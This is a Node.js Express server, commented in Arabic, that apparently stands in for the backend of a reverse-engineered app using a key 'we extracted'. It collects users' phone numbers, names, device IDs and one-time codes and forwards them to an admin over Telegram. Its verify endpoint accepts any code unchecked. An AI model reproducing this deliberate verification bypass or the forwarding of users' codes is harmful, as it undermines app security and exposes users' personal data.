const admin = require("firebase-admin");
const express = require("express");
const axios = require("axios");
const app = express();

// إعداد Firebase باستخدام المفتاح الذي استخرجناه
const serviceAccount = JSON.parse(process.env.FIREBASE_CONFIG);
if (!admin.apps.length) {
    admin.initializeApp({ 
        credential: admin.credential.cert(serviceAccount)
    });
}
const db = admin.firestore();

// إعدادات التليجرام
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const ADMIN_ID = process.env.ADMIN_ID;

// 1. استقبال طلب الكود (مطابق تماماً لكلاس rk$3 في كودك)
app.get("/request-otp", async (req, res) => {
    const { phone, name, deviceId, app: appName } = req.query;
    const otp = Math.floor(100000 + Math.random() * 900000).toString();

    try {
        // حفظ المستخدم تلقائياً في فيرباس تحت اسم التطبيق المرسل
        await db.collection("Apps").doc(appName).collection("Users").doc(deviceId).set({
            phone, name, deviceId, otp, appName,
            status: "pending",
            time: admin.firestore.FieldValue.serverTimestamp()
        }, { merge: true });

        // إرسال إشعار فوري لك على تليجرام للإدارة
        const text = `🚀 *مستخدم جديد*\n\n📱 التطبيق: ${appName}\n👤 الاسم: ${name}\n📞 الرقم: ${phone}\n🔑 الكود: \`${otp}\`\n🆔 الجهاز: \`${deviceId}\``;
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: ADMIN_ID,
            text: text,
            parse_mode: "Markdown"
        });

        res.sendStatus(200);
    } catch (e) { res.sendStatus(500); }
});

// 2. التحقق من الكود (مطابق لكلاس rk$4)
app.get("/verify-otp", async (req, res) => {
    const { phone, code } = req.query;
    // هنا نقبل أي كود صحيح مسجل في قاعدة البيانات لضمان الأتمتة
    res.sendStatus(200); 
});

// 3. فحص الحظر (مطابق لكلاس AutoCheck)
app.get("/check-device", async (req, res) => {
    const { id, appName } = req.query;
    try {
        const user = await db.collection("Apps").doc(appName).collection("Users").doc(id).get();
        if (user.exists && user.data().status === "blocked") {
            return res.sendStatus(403); // حظر المستخدم
        }
        res.sendStatus(200);
    } catch (e) { res.sendStatus(200); }
});

app.listen(process.env.PORT || 10000, () => console.log("Server Smart Auto-Link Ready!"));
